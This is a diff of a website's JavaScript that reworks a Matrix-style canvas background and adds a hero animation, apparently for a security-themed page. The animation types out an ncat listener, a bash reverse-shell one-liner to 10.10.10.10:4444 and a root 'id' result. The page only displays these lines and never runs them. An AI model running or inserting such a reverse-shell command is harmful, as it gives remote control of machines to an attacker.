@@ -71,44 +71,34 @@
   if(grid) io.observe(grid); else run();
 })();
 
-
-/* === Global Matrix Background (improved) === */
+/* ===== Fondo Matrix (canvas) ===== */
 (function(){
-  const c = document.getElementById('matrix-universe');
+  const c = document.getElementById('matrix-bg');
   if(!c) return;
   const ctx = c.getContext('2d');
-  let w, h, cols, drops, speeds, dpr;
-  const glyphs = Array.from("アカサタナハマヤラワガザダバパイキシチニヒミリギジヂビウクスツヌフムユルグズヅブエケセテネヘメレゲゼデベオコソトノホモヨロゴゾドボ0123456789");
-  const HEAD = "#aaffcc", TAIL = "#0b3";
-  const CELL = 14, ROW = 16, FADE = 0.08;
+  let w=0,h=0,cols=0,y=[];
+  const glyphs = '$#%&*+<>=-abcdefghijklmnopqrstuvwxyz0123456789'.split('');
+  const CELL = 14, ROW = 16;
 
   function fit(){
-    const rect = c.getBoundingClientRect();
-    dpr = Math.max(1, window.devicePixelRatio || 1);
-    c.width = Math.floor(rect.width * dpr);
-    c.height = Math.floor(rect.height * dpr);
-    w = c.width / dpr; h = c.height / dpr;
+    const r = c.getBoundingClientRect();
+    const dpr = Math.max(1, window.devicePixelRatio || 1);
+    c.width  = Math.floor(r.width * dpr);
+    c.height = Math.floor(r.height * dpr);
+    w = c.width; h = c.height;
     ctx.setTransform(dpr,0,0,dpr,0,0);
-    cols = Math.ceil(w / CELL);
-    drops = new Array(cols).fill(0);
-    speeds = new Array(cols).fill(0).map(()=> 8 + Math.random()*18);
-    ctx.font = '14px monospace';
+    cols = Math.ceil(r.width / CELL);
+    y = new Array(cols).fill(0);
   }
   function tick(){
-    ctx.fillStyle = `rgba(0,0,0,${FADE})`;
-    ctx.fillRect(0,0,w,h);
+    ctx.fillStyle = 'rgba(0,0,0,0.09)'; ctx.fillRect(0,0,w,h);
+    ctx.fillStyle = '#ff2a55';
+    ctx.font = '14px monospace';
     for(let i=0;i<cols;i++){
-      const x = i*CELL;
-      const y = drops[i]*ROW;
-      ctx.fillStyle = TAIL;
-      ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y-ROW);
-      ctx.fillStyle = HEAD;
-      ctx.fillText(glyphs[(Math.random()*glyphs.length)|0], x, y);
-      drops[i] += speeds[i]/16;
-      if(y > h + 100 || Math.random() > 0.995){
-        drops[i] = -Math.random()*50;
-        speeds[i] = 8 + Math.random()*18;
-      }
+      const text = glyphs[(Math.random()*glyphs.length)|0];
+      ctx.fillText(text, i*CELL, y[i]*ROW);
+      if(y[i]*ROW > h && Math.random() > 0.975) y[i] = 0;
+      else y[i]++;
     }
     raf = requestAnimationFrame(tick);
   }
@@ -117,4 +107,39 @@
   if (matchMedia('(prefers-reduced-motion: reduce)').matches){
     cancelAnimationFrame(raf); ctx.clearRect(0,0,w,h);
   }
+})();
+
+/* ===== Hero: reverse shell + id(root) ===== */
+(function(){
+  const A = document.querySelector('[data-ty="a"]');
+  const B = document.querySelector('[data-ty="b"]');
+  if(!A || !B) return;
+  const a = [
+    "ncat -lvnp 4444",
+    "listening on [any] 4444 ...",
+    "connection received from 10.10.10.42",
+    "id",
+    "uid=0(root) gid=0(root) groups=0(root)"
+  ];
+  const b = [ "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" ];
+
+  function type(el, s, d){
+    return new Promise(res=>{
+      let i=0;(function step(){
+        if(i<s.length){ el.textContent += s.charAt(i++); setTimeout(step,d); }
+        else{ el.textContent += "\n"; res(); }
+      })();
+    });
+  }
+  async function run(){
+    A.textContent=""; B.textContent="";
+    await type(A, a[0], 14);
+    await type(A, a[1], 10);
+    await type(B, b[0], 12);
+    await type(A, a[2], 12);
+    await type(A, a[3], 14);
+    await type(A, a[4], 10);
+  }
+  if(document.readyState === 'loading') addEventListener('DOMContentLoaded', run);
+  else run();
 })();
